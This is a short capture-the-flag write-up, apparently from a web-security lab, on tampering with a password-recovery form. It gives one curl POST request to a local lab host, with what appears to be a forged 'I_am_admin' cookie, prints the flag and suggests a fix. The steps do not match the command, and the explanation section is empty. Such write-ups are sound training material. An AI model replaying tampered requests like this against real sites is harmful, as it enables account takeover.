# Form data manipulation 2

### Breach description

Change the value of the input “name” of the recover password form with the value root  (replace webaster@…)

```bash
curl 'http://192.168.64.6/?page=recover#' --compressed -X POST -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://192.168.64.6' -H 'Connection: keep-alive' -H 'Referer: http://192.168.64.6/?page=recover' -H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'mail=test&Submit=Submit'
```

**The flag is : 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0**

### Explanation of the breach

### Breach Fix

Recover password using another method such as sending a recovery link to a provided email address from the user and checking if the address is a known address before sending a recovery email.
